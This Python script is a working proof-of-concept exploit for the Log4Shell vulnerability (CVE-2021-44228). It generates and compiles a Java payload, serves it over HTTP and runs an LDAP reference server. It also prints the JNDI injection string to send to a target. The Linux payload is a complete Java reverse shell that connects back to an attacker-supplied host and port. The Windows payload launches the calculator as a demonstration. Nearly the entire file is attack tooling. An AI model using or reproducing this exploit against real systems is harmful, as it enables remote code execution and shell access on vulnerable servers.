import argparse
import os
import platform
import shutil
import subprocess
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler
from pathlib import Path

from colorama import Fore, init


def main() -> None:
    """
    Entry point for the Log4Shell POC script.

    Parses command-line arguments, generates a payload, starts an LDAP server,
    and runs a web server.

    Returns:
        None
    """

    init(autoreset=True)

    parser = argparse.ArgumentParser(description="Log4Shell POC")

    parser.add_argument(
        "--userip",
        metavar="userip",
        type=str,
        default="localhost",
        help="Enter IP for LDAPRefServer & Reverse Shell",
    )
    parser.add_argument(
        "--webport",
        metavar="webport",
        type=int,
        default=8000,
        help="Listener port for HTTP port",
    )
    parser.add_argument(
        "--lport",
        metavar="lport",
        type=int,
        default=9001,
        help="Netcat Port",
    )

    args = parser.parse_args()

    print(Fore.BLUE + "[!] CVE: CVE-2021-44228\n")

    try:
        if not is_java_installed():
            print(Fore.RED + "[-] Java is not installed")
            raise SystemExit(1)

        setup_and_run_payload_server(args.userip, args.webport, args.lport)

    except KeyboardInterrupt:
        print(Fore.RED + "[!] user interrupted the program")
        raise SystemExit(0)


def is_java_installed() -> bool:
    """
    Checks whether Java is installed on the system.

    Returns:
        bool: True if Java is installed, False otherwise.
    """

    return bool(shutil.which("java"))


def setup_and_run_payload_server(userip: str, webport: int, lport: int) -> None:
    """
    Sets up and runs a payload server that generates a Java payload based on the operating system.\n
    Starts an LDAP server on a new thread, and a web server on the main thread.

    Args:
        userip (str): The user's IP address.
        webport (int): The port for the web server.
        lport (int): The local port to listen on.

    Returns:
        None
    """

    print(Fore.GREEN + "[+] Generating Payload...")
    generate_payload(userip, lport)

    # start the LDAP server on new thread
    print(Fore.GREEN + "[+] Starting LDAP server\n")
    t1 = threading.Thread(target=run_ldap_server, args=(userip, webport))
    t1.start()

    # start the web server on main thread
    print(Fore.GREEN + f"[+] Starting web server http://0.0.0.0:{webport}\n")
    httpd = HTTPServer(("0.0.0.0", webport), SimpleHTTPRequestHandler)
    httpd.serve_forever()


def generate_payload(userip: str, lport: int) -> None:
    """
    Generates a Java payload based on the operating system and writes it to a file.

    Args:
        userip (str): The user's IP address.
        lport (int): The local port to listen on.

    Returns:
        None
    """

    # determine the payload based on the operating system
    payload_functions = {
        "Linux": linux_payload,
        "Windows": windows_payload,
        "Darwin": macos_payload,
    }

    os_name = platform.system()

    if os_name in payload_functions:
        print(f"[+] Using payload for {os_name}")
        program = payload_functions[os_name](userip, lport)
    else:
        print(Fore.RED + "[-] Unknown operating system. Using default payload.")
        program = default_payload()

    # write the payload to Exploit.java file
    filename = Path("Exploit.java")

    try:
        filename.write_text(program)
        subprocess.run(
            [
                "javac",
                str(filename),
            ]
        )
    except OSError as e:
        print(Fore.RED + f"[-] Failed to create payload: {e}")
        raise e
    else:
        print("[+] Successfully created payload\n")


def run_ldap_server(userip: str, lport: int) -> None:
    """
    Starts an LDAP reference server for exploitation.

    Args:
        userip (str): The IP address of the LDAP server.
        lport (int): The listener port for the LDAP server.

    Returns:
        None
    """

    CURR_DIR = Path(__file__).parent.resolve()

    sendme = f"${{jndi:ldap://{userip}:1389/a}}"

    print(Fore.GREEN + f"[+] Send me: {sendme}\n")

    url = f"http://{userip}:{lport}/#Exploit"
    subprocess.run(
        [
            "java",
            "-cp",
            os.path.join(CURR_DIR, "ldap/marshalsec-0.0.3-SNAPSHOT-all.jar"),
            "marshalsec.jndi.LDAPRefServer",
            url,
        ]
    )


def linux_payload(userip: str, lport: int) -> str:
    """
    Generates a Java program that starts a reverse shell on a Linux system.

    Args:
        userip (str): The IP address of the attacker's machine.
        lport (int): The listener port for the reverse shell.

    Returns:
        str: A Java program that establishes a reverse shell connection.
    """

    program = """
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {

    public Exploit() throws Exception {
        String host="%s";
        int port=%d;
        String cmd="/bin/sh";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s=new Socket(host,port);
        InputStream pi=p.getInputStream(),
            pe=p.getErrorStream(),
            si=s.getInputStream();
        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()) {
            while(pi.available()>0)
                so.write(pi.read());
            while(pe.available()>0)
                so.write(pe.read());
            while(si.available()>0)
                po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            }
            catch (Exception e){
            }
        };
        p.destroy();
        s.close();
    }
}

""" % (userip, lport)

    return program


def windows_payload(userip: str, lport: int) -> str:
    """
    Generates a Java program that starts the calculator application on a Windows system.

    Args:
        userip (str): The user's IP address (not directly used in the program).
        lport (int): The local port to listen on (not directly used in the program).

    Returns:
        str: A Java program that starts the calculator application.
    """

    program = """
public class Exploit {
    public Exploit() {}
    static {
        try {
            System.out.println("Exploit");
            String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
                    ? new String[]{"cmd.exe","/c", "calc.exe"}
                    : new String[]{"open","/System/Applications/Calculator.app"};
            java.lang.Runtime.getRuntime().exec(cmds).waitFor();
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] args) {
        Exploit e = new Exploit();
    }
}

"""

    return program


def macos_payload(userip: str, lport: int) -> None:
    raise NotImplementedError()


def default_payload() -> None:
    raise NotImplementedError()


if __name__ == "__main__":
    main()
